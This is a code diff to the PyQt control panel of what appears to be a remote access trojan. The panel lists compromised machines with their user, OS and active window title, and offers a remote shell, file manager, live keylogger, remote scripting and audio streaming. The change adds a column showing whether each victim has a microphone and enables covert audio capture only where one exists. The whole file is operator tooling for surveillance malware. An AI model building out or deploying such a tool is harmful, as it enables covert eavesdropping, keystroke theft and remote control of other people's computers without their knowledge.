@@ -103,7 +103,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.index_of_lock = 2
         self.index_of_os = 3
         self.index_of_user = 4
-        self.index_of_version = 5
+        self.index_of_microphone = 5
         self.index_of_activeWindowTitle = 6
         # initialize servers table columns width
         self.serversTable.setColumnWidth(self.index_of_ipAddress, 100)
@@ -111,7 +111,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.serversTable.setColumnWidth(self.index_of_lock, 90)
         self.serversTable.setColumnWidth(self.index_of_os, 90)
         self.serversTable.setColumnWidth(self.index_of_user, 90)
-        self.serversTable.setColumnWidth(self.index_of_version, 50)
+        self.serversTable.setColumnWidth(self.index_of_microphone, 50)
         # servers table double click trigger
         self.serversTable.doubleClicked.connect(self.unlock_server)
         # Initializing right click menu
@@ -246,7 +246,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                     self.socks[socket_index]['protection'] = info['protection']
                     self.socks[socket_index]['os'] = info['os']
                     self.socks[socket_index]['user'] = info['user']
-                    self.socks[socket_index]['version'] = info['version']
+                    self.socks[socket_index]['inputdevice'] = info['inputdevice']
                     self.socks[socket_index]['activewindowtitle'] = info['activewindowtitle']
 
                     get(self.sock, 'startChildSocket %s' % socket_index, 'streamingMode')
@@ -346,12 +346,18 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
                 # add server user
                 item = QTableWidgetItem(self.socks[obj]['user'])
+                item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
                 self.serversTable.setItem(index, self.index_of_user, item)
 
                 # add servers version
-                item = QTableWidgetItem(self.socks[obj]['version'])
-                item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
-                self.serversTable.setItem(index, self.index_of_version, item)
+                item = QTableWidgetItem()
+                if self.socks[obj]['inputdevice'] == 'NoDevice':
+                    item.setText('No')
+                    item.setIcon(QIcon(os.path.join(assets, 'mic_no.png')))
+                else:
+                    item.setText('Yes')
+                    item.setIcon(QIcon(os.path.join(assets, 'mic_yes.png')))
+                self.serversTable.setItem(index, self.index_of_microphone, item)
 
                 # add active windows title
                 item = QTableWidgetItem(self.streaming_socks[obj]['activewindowtitle'])
@@ -409,7 +415,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             else:
                 self.remoteExplorerButton.setDisabled(False)
                 self.remoteShellButton.setDisabled(False)
-                self.remoteAudioButton.setDisabled(False)
+                if self.has_microphone():
+                    self.remoteAudioButton.setDisabled(False)
                 self.remoteKeyloggerButton.setDisabled(False)
                 self.remoteScriptingButton.setDisabled(False)
                 self.remoteProcessesButton.setDisabled(False)
@@ -433,6 +440,17 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.unlockServerButton.setDisabled(True)
             self.updatePreviewButton.setDisabled(True)
 
+    def has_microphone(self):
+        try:
+            if str(self.serversTable.item(self.serversTable.currentRow(), self.index_of_microphone).text()) == 'Yes':
+                return True
+            else:
+                return False
+        except AttributeError:
+            warn = QMessageBox(QMessageBox.Warning, 'Error', 'No Server Selected', QMessageBox.Ok)
+            warn.exec_()
+            return False
+
     def server_right_click_menu(self, point):
         server_index = self.serversTable.currentRow()
         server_menu = QMenu(self)
@@ -448,14 +466,16 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                                       lambda: self.run_plugin('shellMode'))
                 server_menu.addAction(QIcon(os.path.join(assets, 'mexplorer.png')), 'File Manager',
                                       lambda: self.run_plugin('explorerMode'))
-                server_menu.addAction(QIcon(os.path.join(assets, 'maudio.png')), 'Audio Streaming',
-                                      lambda: self.run_plugin('audioMode'))
-                server_menu.addAction(QIcon(os.path.join(assets, 'mkeylogger.png')), 'Live Keylogger',
-                                      lambda: self.run_plugin('keyloggerMode'))
-                server_menu.addAction(QIcon(os.path.join(assets, 'script.png')), 'Remote Scripting',
-                                      lambda: self.run_plugin('scriptingMode'))
                 server_menu.addAction(QIcon(os.path.join(assets, 'mprocesses.png')), 'Processes',
                                       lambda: self.run_plugin('processesMode'))
+                audio_menu = server_menu.addAction(QIcon(os.path.join(assets, 'maudio.png')), 'Audio Streaming',
+                                          lambda: self.run_plugin('audioMode'))
+                if not self.has_microphone():
+                    audio_menu.setEnabled(False)
+                server_menu.addAction(QIcon(os.path.join(assets, 'script.png')), 'Remote Scripting',
+                                      lambda: self.run_plugin('scriptingMode'))
+                server_menu.addAction(QIcon(os.path.join(assets, 'mkeylogger.png')), 'Live Keylogger',
+                                      lambda: self.run_plugin('keyloggerMode'))
 
                 server_menu.addSeparator()
                 server_menu.addMenu(server_options_menu)
